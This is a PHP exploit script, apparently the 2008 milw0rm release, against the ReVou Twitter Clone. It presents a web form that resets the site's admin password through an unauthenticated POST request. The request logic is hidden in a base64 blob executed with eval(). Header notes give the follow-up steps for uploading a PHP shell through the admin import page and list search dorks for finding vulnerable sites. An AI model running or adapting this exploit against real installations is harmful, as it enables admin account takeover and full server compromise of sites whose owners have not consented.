<?php
/*
==============================================================================
                      _      _       _          _      _   _ 
                     / \    | |     | |        / \    | | | |
                    / _ \   | |     | |       / _ \   | |_| |
                   / ___ \  | |___  | |___   / ___ \  |  _  |
   IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|
                                                             
==============================================================================
	ReVou Twitter Clone Admin Password Changing Exploit
==============================================================================
	[Â»] Script:             [ ReVou Twitter Clone ]
	[Â»] Language:           [ PHP, MySQL ]
	[Â»] homepage:           [ http://www.revou.com/ ]
	[Â»] Type:               [ Commercial ]
	[Â»] found-report:       [ 14.12.2008-19.12.2008 ]
	[Â»] Founder.coder:      [ G4N0K <mail.ganok[at]gmail.com> ]
===[ NOTES ]===
	[.] Reset pwd, login as ADMIN, use this path to upload your php-shell-script: http://site.tld/revou/adminlogin/index.php?id=dbimport
	[.] your file is here: http://site.tld/revou/db_backup/shell.php
===[ GGL-DORKS ]===
	"Joined ReVou"
	"Tell the world what you're doing at this moment!"
	"days ago from web" "RSS feed" "API"
	...
===[ LIVE ]===
	[Â»] http://www.revou.com/demo/
===[ Greetz ]===
	[Â»] ALLAH
	[Â»] rgod <- WTF, you dont know him...!
	[Â»] Tornado2800, B13, AFSHIN-ZARBAT, QU1E, Hussain-X, "SauDi L0rD", Sakab ...
	[Â»] Oops I forgot someone -> Str0ke, Keep-it-up Brotha :-)
	//Are ya looking for something that has not BUGz at all...!? I know it... It's The Holy Quran. [:-)
	//ALLAH,fo-gimme...
*/

error_reporting(E_ALL);
echo <<<HTML
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>ReVou Twitter Clone Admin Password Changing Exploit | G4N0K</title>
<style type="text/css">
body{
	font-family:Tahoma, "Lucida Grande", "Lucida Sans Unicode", Verdana, Arial, Helvetica, sans-serif;
	background-color:#CCCCCC;
	font-size:8pt;
}


fieldset{
	border:solid 1px #DEDEDE;
}
fieldset legend {
	font-weight:bold;

}
fieldset ul, fieldset li{
	border:0; margin:0; padding:0; list-style:none;
}
fieldset li{
	clear:both;
	list-style:none;
	padding:10px;
}

fieldset input{
	float:left;
}
fieldset label{
	width:140px;
	float:left;
	text-align:right;
	padding-right:3px;
}
.dv {background:white;margin:auto;border:#666666 1px solid;width:700px;}
</style>
</head>
<body>
<div class="dv">
<div style="text-align:center;"><pre>
==============================================================================
                      _      _       _          _      _   _                  
                     / \    | |     | |        / \    | | | |                 
                    / _ \   | |     | |       / _ \   | |_| |                 
                   / ___ \  | |___  | |___   / ___ \  |  _  |                 
   IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|                 
                                                                              
                                                                              
==============================================================================
                      ____   _  _     _   _    ___    _  __                   
                     / ___| | || |   | \ | |  / _ \  | |/ /                   
                    | |  _  | || |_  |  \| | | | | | | ' /                    
                    | |_| | |__   _| | |\  | | |_| | | . \                    
         Exploit By  \____|    |_|   |_| \_|  \___/  |_|\_\                   
                                                                              
==============================================================================
ReVou Twitter Clone Admin Password Changing Exploit
==============================================================================
</pre></div>
HTML;
$FORM= <<<FFF
<div align="center">
<form style="width:550px;" action="{$_SERVER['PHP_SELF']}" method="post">
Path ex: /script/
	<fieldset>
	<legend><b>&nbsp;E x p l o i t&nbsp;</b></legend><br />
	<ul><li><label for="uri_GNK">Host:</label>
	<input style="border: 1px solid #ccc;width:170px;" id="uri_GNK" name="uri_GNK" type="text" value=""></li>
	<li><label for="port_GNK">&nbsp;Port:</label>
	<input style="border: 1px solid #ccc;width:40px;" id="port_GNK" name="port_GNK" type="text" value="80"></li>
	<li><label for="path_GNK">&nbsp;Path:</label>
	<input style="border: 1px solid #ccc;width:70px;" id="path_GNK" name="path_GNK" type="text" value="/"></li>
	<li><label for="nwpwd_GNK">&nbsp;New-Password:</label>
	<input style="border: 1px solid #ccc;width:70px;" id="nwpwd_GNK" name="nwpwd_GNK" type="text" value="G4N0K"></ul></li><br />
	</fieldset><br /><br />
	<input id="go_GNK" name="go_GNK" type="submit" value="Action!">
	<input id="reset_GNK" name="reset_GNK" type="reset" value="Reset"><br />
</form></div>
<br /><br />
</div>
FFF;

$GNK = "aWYgKGlzc2V0KCRfUE9TVFsnZ29fR05LJ10pICYmIGlzc2V0KCRfUE9TVFsidXJpX0dOSyJdKSAm".
       "JiAhZW1wdHkoJF9QT1NUWyJ1cmlfR05LIl0pICYmIGlzc2V0KCRfUE9TVFsicGF0aF9HTksiXSkg".
       "JiYgIWVtcHR5KCRfUE9TVFsicGF0aF9HTksiXSkgJiYgaXNzZXQoJF9QT1NUWyJud3B3ZF9HTksi".
       "XSkgJiYgIWVtcHR5KCRfUE9TVFsibndwd2RfR05LIl0pKSB7JHBzdCA9ICJuZXdwYXNzMT0iLiRf".
       "UE9TVFsnbndwd2RfR05LJ10uIiZuZXdwYXNzMj0iLiRfUE9TVFsnbndwd2RfR05LJ10uIiZvaz1D".
       "aGFuZ2UiOyRjaGVuY2hvayA9IHN0cmxlbigkcHN0KTskam9rZSA9ICJQT1NUICIuJF9QT1NUWyJw".
       "YXRoX0dOSyJdLiIvYWRtaW5sb2dpbi9wYXNzd29yZC5waHAgSFRUUC8xLjFcclxuSG9zdDogIi4k".
       "X1BPU1RbInVyaV9HTksiXS4iXHJcblVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzOyBV".
       "OyBXaW5kb3dzIE5UIDUuMTsgZW4tVVM7IHJ2OjEuOSkgR2Vja28vMjAwODA1MjkwNiBGaXJlZm94".
       "LzMuMFxyXG5LZWVwLUFsaXZlOiAzMDBcclxuQ29ubmVjdGlvbjoga2VlcC1hbGl2ZVxyXG5Db250".
       "ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFxyXG5Db250ZW50LUxl".
       "bmd0aDogIi4kY2hlbmNob2suIlxyXG5cclxuIjskam9rZSAuPSAkcHN0LiJcclxuIjskcmVzID0g".
       "IiI7JGF0dGFjayA9IGZzb2Nrb3BlbigkX1BPU1RbInVyaV9HTksiXSwkX1BPU1RbInBvcnRfR05L".
       "Il0sJGVycm5vLCAkZXJyc3RyLCA1MCk7aWYoISRhdHRhY2spe2VjaG8oIjxiciAvPjxiPndoYXQg".
       "YXJlIHlhIGRvaW5nLi4uISA8YnIgLz5TdW10aGluZyB3ZW50IHdyb25nLi4uISA8L2I+PGJyIC8+".
       "PGJyIC8+PC9kaXY+Iik7fWVjaG8oIjxkaXYgc3R5bGU9XCJmb250Om5vcm1hbCA4cHQgdGFob21h".
       "O3BhZGRpbmctbGVmdDo1MHB4O1wiPlsrXSA8Yj5Db25uZWN0ZWQuLi48YnIvPjwvYj5bK10gPGI+".
       "U2VuZGluZyByZXF1ZXN0Li4uPGJyLz48L2I+Iik7ZndyaXRlKCRhdHRhY2ssJGpva2UpO3doaWxl".
       "KCFmZW9mKCRhdHRhY2spKXskcmVzLj1mZ2V0cygkYXR0YWNrKTt9ZmNsb3NlKCRhdHRhY2spO2lm".
       "IChzdHJpc3RyKCRyZXMsICJzdWNjZXNzZnVsbHkiKSl7ZWNobyAiWytdPGI+IEV4cGxvaXRlZCAh".
       "IDwvYj48YnIgLz5bK10gPGI+PGZvbnQgY29sb3I9XCJyZWRcIj5wYXNzd29yZCBjaGFuZ2VkLi4u".
       "PC9iPjwvZm9udD48YnIgLz5bK10gPGI+TmV3IHBhc3N3b3JkIGlzIDogIi4kX1BPU1RbIm53cHdk".
       "X0dOSyJdLiI8L2I+IDxiciAvPlsrXTxiPiBhZG1pbiBwYW5lbDo8L2I+IDxhIGhyZWY9XCJodHRw".
       "Oi8vIi4kX1BPU1RbInVyaV9HTksiXS4kX1BPU1RbInBhdGhfR05LIl0uImFkbWlubG9naW4vXCI+".
       "IGh0dHA6Ly8iLiRfUE9TVFsidXJpX0dOSyJdLiRfUE9TVFsicGF0aF9HTksiXS4iYWRtaW5sb2dp".
       "bi88L2E+PGJyIC8+PGJyIC8+PGJyIC8+PGJyIC8+PGJyIC8+PGJyIC8+PGJyIC8+PHNwYW4gc3R5".
       "bGU9XCJmb250Om5vcm1hbCA4cHQgdGFob21hO2NvbG9yOiNDQ0M7XCI+RXhwbG9pdCBCeSBHNE4w".
       "Sy4uLjwvc3Bhbj48YnIgLz48YnIgLz48L2Rpdj4iO30gZWxzZSB7IGVjaG8gIlsrXTxiPiBPb3Bz".
       "ICwgIHNyeSAsICA8dT5ub3QgVnVsbmVyYWJsZTwvdT4gLiAuIC4gITwvYj48YnIgLz48YnIgLz48".
       "L2Rpdj4iO31mbHVzaCgpOyB9IGVsc2UgeyBlY2hvICRGT1JNO30=";eval(base64_decode($GNK));
?>

# milw0rm.com [2008-12-19]
